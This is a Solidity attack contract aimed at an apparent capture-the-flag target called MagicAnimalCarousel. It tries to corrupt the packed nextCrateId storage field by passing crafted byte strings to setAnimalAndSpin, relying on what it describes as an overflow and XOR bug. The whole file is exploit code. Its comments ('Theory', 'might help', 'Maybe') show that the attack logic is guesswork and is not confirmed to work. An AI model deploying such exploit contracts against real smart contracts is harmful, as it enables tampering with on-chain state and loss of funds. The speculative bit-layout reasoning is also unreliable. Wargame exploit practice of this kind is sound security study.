// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IMagicAnimalCarousel {
    function setAnimalAndSpin(string calldata animal) external;
    function MAX_CAPACITY() external view returns (uint16);
    function currentCrateId() external view returns (uint256);
    function carousel(uint256) external view returns (uint256);
}

contract WinningAttack {
    IMagicAnimalCarousel public target;
    
    constructor(address _target) {
        target = IMagicAnimalCarousel(_target);
    }
    
    function winByReachingMaxCapacity() external {
        // Theory: The winning condition is when currentCrateId == MAX_CAPACITY - 1 (65534)
        // or when it wraps around to 0 from MAX_CAPACITY
        
        // The bug allows us to corrupt the nextCrateId field
        // Let's create an attack that jumps directly to near MAX_CAPACITY
        
        // We need to analyze the bit layout:
        // Bits 0-159: owner address
        // Bits 160-175: nextCrateId (16 bits)
        // Bits 176-255: animal data (80 bits)
        
        // With the bug, our animal data gets shifted to bits 176-255
        // But we want to affect bits 160-175 (nextCrateId)
        
        // Since XOR is used, we can flip bits
        // Let's craft a sequence to reach the target
        
        // First attempt - try to reach 65534
        bytes memory data = new bytes(12);
        data[0] = 0xFF;
        data[1] = 0xFE; // This might help us reach 65534
        
        target.setAnimalAndSpin(string(data));
    }
    
    function spamUntilWin() external {
        // Maybe we need to keep calling until we hit the right state
        uint16 maxCap = target.MAX_CAPACITY();
        
        // Try different patterns
        for(uint i = 0; i < 10; i++) {
            bytes memory data = new bytes(12);
            data[0] = bytes1(uint8(i));
            data[1] = 0xFF;
            data[2] = 0xFF;
            
            target.setAnimalAndSpin(string(data));
            
            if(target.currentCrateId() >= maxCap - 10) {
                break;
            }
        }
    }
    
    function exploitXorBehavior() external {
        // The XOR operation in setAnimalAndSpin might be key
        // carousel[nextCrateId] = (carousel[nextCrateId] & ~NEXT_ID_MASK) ^ (encodedAnimal << 176)
        
        // Since it's XOR, calling twice with same data would cancel out
        // But with the overflow, we might affect different bits
        
        // Try to create a specific bit pattern that when XORed
        // will give us control over nextCrateId
        
        string memory pattern1 = unicode"AAAAAAAAAA"; // Repetitive pattern
        target.setAnimalAndSpin(pattern1);
    }
}